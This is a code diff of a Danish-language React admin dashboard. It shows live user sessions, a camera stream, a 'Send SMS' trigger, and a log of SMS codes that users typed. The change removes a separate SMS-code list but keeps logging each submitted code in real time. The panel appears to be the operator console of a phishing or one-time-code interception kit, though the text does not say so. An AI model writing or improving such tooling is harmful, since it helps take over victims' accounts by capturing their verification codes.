@@ -16,7 +16,6 @@ const PER_PAGE = 6
 export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [sessions, setSessions] = useState<Session[]>([])
   const [selected, setSelected] = useState<Session | null>(null)
-  const [smsCodes, setSmsCodes] = useState<{ code: string; created_at: string }[]>([])
   const [log, setLog] = useState<LogEntry[]>([])
   const [loading, setLoading] = useState(true)
   const [cameraStream, setCameraStream] = useState<MediaStream | null>(null)
@@ -48,8 +47,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
 
   const refreshSelected = useCallback(async (sessionId: string) => {
     try {
-      const [sms, logs] = await Promise.all([api.getSmsCodes(sessionId), api.getLog(sessionId)])
-      setSmsCodes(sms)
+      const logs = await api.getLog(sessionId)
       setLog(logs)
       const sessions = await api.getSessions()
       setSessions(sessions)
@@ -70,14 +68,12 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const selectSession = async (s: Session) => {
     setSelected(s)
     try {
-      const [sms, logs] = await Promise.all([api.getSmsCodes(s.sessionId), api.getLog(s.sessionId)])
-      setSmsCodes(sms)
+      const logs = await api.getLog(s.sessionId)
       setLog(logs)
     } catch {}
 
     const ws = connectAdmin(s.sessionId, (data) => {
       if (data.type === 'user-verified') { loadSessions() }
-      if (data.type === 'sms-code') setSmsCodes(p => [{ code: data.code, created_at: new Date().toISOString() }, ...p])
       if (data.type === 'status-changed') setSelected(p => p ? { ...p, [data.field]: data.value } : null)
       if (data.type === 'sms-submitted') {
         setLog(p => [{ event_type: 'sms_code_submitted', detail: `Bruger indtastede kode: ${data.code}`, created_at: new Date().toISOString() }, ...p])
@@ -299,20 +295,10 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             </div>
 
             <div className="mb-5">
-              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">SMS-koder</div>
+              <div className="text-[10px] text-gray-400 uppercase tracking-wider mb-2 font-bold">SMS</div>
               <button onClick={activateSms} className="w-full bg-blue-600 hover:bg-blue-700 text-white text-[12px] py-2 px-3 rounded-xl cursor-pointer transition-colors font-bold shadow-sm">
                 + Send SMS
               </button>
-              <div className="mt-2 max-h-[120px] overflow-y-auto">
-                {smsCodes.length === 0 ? (
-                  <div className="text-[11px] text-gray-300 py-2 text-center">Ingen koder endnu</div>
-                ) : smsCodes.map((s, i) => (
-                  <div key={i} className="flex items-center justify-between text-[11px] py-1.5 border-b border-gray-100 last:border-0">
-                    <span className="text-emerald-600 font-mono font-bold">{s.code}</span>
-                    <span className="text-gray-400">{formatTime(s.created_at)}</span>
-                  </div>
-                ))}
-              </div>
             </div>
 
             <div className="mt-auto pt-3 border-t border-gray-100">
